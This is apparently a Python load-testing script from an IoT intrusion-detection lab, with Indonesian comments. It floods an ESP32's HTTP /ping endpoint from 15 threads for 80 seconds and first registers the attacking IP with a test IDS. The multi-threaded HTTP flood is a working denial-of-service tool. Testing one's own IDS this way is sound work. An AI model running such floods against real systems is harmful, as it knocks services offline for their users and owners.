
"""
DoS Attacker v8.0 — Registered HTTP Multi-Thread Test
=====================================================
Tujuan:
- Menguji ketahanan ESP32 melalui HTTP /ping.
- Menggunakan 15 thread seperti DoS Attacker v2.1.
- Mendaftarkan IP penyerang ke IDS sebelum pengujian.
- Memastikan IDS mengenali attacker sebagai IP namespace penguji (GARDA_ATTACKER_IP).
- Berhenti otomatis setelah ATTACK_DURATION (80 detik) atau ketika CTRL+C ditekan.

PENTING:
Jalankan dari network namespace ids-attacker.
Jangan jalankan langsung dari host Raspberry Pi.
"""

import os
import requests
import time
import threading
import statistics
import signal
import sys
from urllib.parse import urlparse

# ─── KONFIGURASI LINGKUNGAN ──────────────────────────────
# Alamat perangkat dan lokasi token TIDAK ditulis di source code.
# Nilai dibaca dari environment variable atau dari file KEY=VALUE
# (default /etc/garda-iot/garda.env, lihat deploy/garda.env.example).
GARDA_ENV_FILE = os.environ.get("GARDA_ENV_FILE", "/etc/garda-iot/garda.env")


def _load_env_file(path):
    values = {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, value = line.split("=", 1)
                values[key.strip()] = value.strip().strip('"').strip("'")
    except FileNotFoundError:
        pass
    return values


_GARDA_CFG = _load_env_file(GARDA_ENV_FILE)


def cfg(key, default=None):
    """Ambil konfigurasi: environment variable > file garda.env > default."""
    value = os.environ.get(key, _GARDA_CFG.get(key, default))
    if value is None or str(value).strip() == "":
        raise SystemExit(
            f"[CONFIG] {key} belum diatur. Salin deploy/garda.env.example ke "
            f"{GARDA_ENV_FILE} lalu isi nilainya."
        )
    return str(value).strip()


# =========================================================
# 1. TARGET DAN REGISTRASI IDS
# =========================================================

# ESP32 yang menjadi target pengujian
IP_ESP32 = cfg("GARDA_ESP32_IP")
TARGET_URL = f"http://{IP_ESP32}/ping"

# IDS server pada jaringan virtual Raspberry Pi
IDS_SERVER_URL = f"http://{cfg('GARDA_IDS_HOST_IP', '10.200.0.1')}:5000"
IDS_TOKEN_PATH = cfg(
    "GARDA_IDS_TOKEN_PATH",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), ".ids_test_token")
)

# IP yang harus dikenali oleh IDS sebagai attacker
IDS_EXPECTED_ATTACKER_IP = cfg("GARDA_ATTACKER_IP", "10.200.0.2")

# =========================================================
# 2. PARAMETER PENGUJIAN
# =========================================================

NUM_THREADS = 15

# Jeda antar-request setiap thread (10 ms)
DELAY_MS = 10

# Durasi pengujian (detik)
ATTACK_DURATION = 80

# Timeout koneksi dan respons HTTP
REQUEST_TIMEOUT = (1, 2)

# =========================================================
# 3. STATE DAN STATISTIK
# =========================================================

sukses = 0
gagal = 0
latencies = []

lock = threading.Lock()
stop_event = threading.Event()

t_mulai = 0.0


# =========================================================
# 4. VALIDASI TARGET
# =========================================================

def validate_configuration():
    """Pastikan target sesuai dengan perangkat lab."""

    parsed = urlparse(TARGET_URL)

    if parsed.hostname != IP_ESP32:
        raise RuntimeError("Target URL tidak sesuai konfigurasi.")

    if not IDS_EXPECTED_ATTACKER_IP.startswith("10.200.0."):
        raise RuntimeError("IP attacker harus berada di subnet namespace penguji (10.200.0.0/24).")

    if parsed.path != "/ping":
        raise RuntimeError("Endpoint pengujian harus /ping.")


# =========================================================
# 5. REGISTRASI ATTACKER KE IDS
# =========================================================

def register_test_client():
    """
    Daftarkan IP namespace ke IDS.
    Registrasi dilakukan sebelum HTTP test dimulai.
    """

    try:
        with open(IDS_TOKEN_PATH, "r", encoding="utf-8") as file:
            token = file.read().strip()

        if not token:
            raise RuntimeError("Token IDS kosong.")

        response = requests.post(
            f"{IDS_SERVER_URL}/register-test-client",
            headers={"X-IDS-Test-Token": token},
            timeout=5
        )

        response.raise_for_status()
        data = response.json()

        if data.get("ok") is not True:
            raise RuntimeError("Registrasi ditolak IDS.")

        if data.get("attacker_ip") != IDS_EXPECTED_ATTACKER_IP:
            raise RuntimeError(
                f"IP tidak sesuai. Diterima: {data.get('attacker_ip')}"
            )

        print(
            f"[REGISTRATION] BERHASIL | "
            f"Attacker IP: {data['attacker_ip']} | "
            f"TTL: {data.get('expires_in')} detik"
        )

        return True

    except Exception as exc:
        print(
            f"[REGISTRATION] GAGAL | "
            f"{type(exc).__name__}: {exc}"
        )
        return False


# =========================================================
# 6. HANDLER CTRL+C
# =========================================================

def handle_exit(sig, frame):
    """Hentikan seluruh thread ketika CTRL+C ditekan."""

    if not stop_event.is_set():
        print("\n[STOP] CTRL+C diterima. Menghentikan pengujian...")
        stop_event.set()


signal.signal(signal.SIGINT, handle_exit)


# =========================================================
# 7. HTTP ATTACK WORKER
# =========================================================

def attack(thread_id):
    """
    Setiap thread mengirim HTTP GET ke endpoint /ping.
    Session dibuat terpisah untuk setiap thread.
    """

    global sukses, gagal

    session = requests.Session()

    while not stop_event.is_set():

        start_time = time.perf_counter()

        try:
            response = session.get(
                TARGET_URL,
                timeout=REQUEST_TIMEOUT,
                headers={"Connection": "close"}
            )

            latency = (time.perf_counter() - start_time) * 1000

            with lock:
                if response.status_code == 200:
                    sukses += 1
                    latencies.append(latency)
                else:
                    gagal += 1

            response.close()

        except requests.RequestException:
            with lock:
                gagal += 1

        # Jeda antar-request setiap thread.
        # Event memungkinkan thread berhenti lebih cepat.
        stop_event.wait(DELAY_MS / 1000.0)

    session.close()


# =========================================================
# 8. PROGRESS MONITOR
# =========================================================

def monitor():
    """Menampilkan statistik setiap 5 detik."""

    while not stop_event.wait(5):

        with lock:
            total = sukses + gagal

            avg_latency = (
                statistics.mean(latencies)
                if latencies else 0
            )

            success_count = sukses
            failed_count = gagal

        elapsed = max(time.monotonic() - t_mulai, 0.001)
        effective_rps = success_count / elapsed

        print(
            f"[MONITOR] "
            f"Total: {total} | "
            f"Sukses: {success_count} | "
            f"Gagal: {failed_count} | "
            f"RPS efektif: {effective_rps:.1f} | "
            f"Latency avg: {avg_latency:.2f} ms"
        )


# =========================================================
# 9. MAIN
# =========================================================

if __name__ == "__main__":

    print("=" * 65)
    print(" DoS Attacker v8.0 — Registered HTTP Multi-Thread Test")
    print("=" * 65)

    try:
        validate_configuration()
    except RuntimeError as exc:
        print(f"[CONFIG ERROR] {exc}")
        sys.exit(1)

    print(f" Target ESP32 : {IP_ESP32}")
    print(f" Target URL   : {TARGET_URL}")
    print(f" IDS Server   : {IDS_SERVER_URL}")
    print(f" Attacker IP  : {IDS_EXPECTED_ATTACKER_IP}")
    print(f" Threads      : {NUM_THREADS}")
    print(f" Delay        : {DELAY_MS} ms per thread")
    print(f" Durasi       : {ATTACK_DURATION} detik")
    print("=" * 65)

    input("\nTekan ENTER untuk registrasi dan memulai pengujian...")

    # Registrasi wajib berhasil sebelum pengujian dimulai.
    if not register_test_client():
        print("[STOP] Registrasi gagal. Tidak ada trafik pengujian.")
        sys.exit(1)

    print("\n[START] Registrasi valid. Memulai pengujian HTTP...")

    t_mulai = time.monotonic()
    deadline = t_mulai + ATTACK_DURATION

    # Thread monitor statistik
    monitor_thread = threading.Thread(
        target=monitor,
        daemon=True
    )
    monitor_thread.start()

    # Buat worker HTTP
    threads = []

    for i in range(NUM_THREADS):
        worker = threading.Thread(
            target=attack,
            args=(i + 1,),
            daemon=True
        )

        threads.append(worker)
        worker.start()

    # Tunggu sampai durasi habis atau CTRL+C.
    try:
        while not stop_event.is_set():
            remaining = deadline - time.monotonic()

            if remaining <= 0:
                print(f"\n[STOP] Durasi pengujian {ATTACK_DURATION} detik tercapai.")
                stop_event.set()
                break

            stop_event.wait(min(0.2, remaining))

    except KeyboardInterrupt:
        handle_exit(None, None)

    # Pastikan worker diberi kesempatan berhenti.
    for worker in threads:
        worker.join(timeout=3)

    # =====================================================
    # 10. HASIL AKHIR
    # =====================================================

    duration = time.monotonic() - t_mulai

    with lock:
        total_sukses = sukses
        total_gagal = gagal
        final_latencies = list(latencies)

    print("\n" + "=" * 65)
    print(" PENGUJIAN SELESAI")
    print("=" * 65)

    print(f" Durasi          : {duration:.2f} detik")
    print(f" Total sukses    : {total_sukses}")
    print(f" Total gagal     : {total_gagal}")

    if final_latencies:
        print(
            f" Latency rata-rata: "
            f"{statistics.mean(final_latencies):.2f} ms"
        )
        print(f" Latency maksimum : {max(final_latencies):.2f} ms")
        print(f" Latency minimum  : {min(final_latencies):.2f} ms")

    print(
        f" RPS efektif     : "
        f"{total_sukses / max(duration, 0.001):.2f} req/s"
    )

    print("=" * 65)
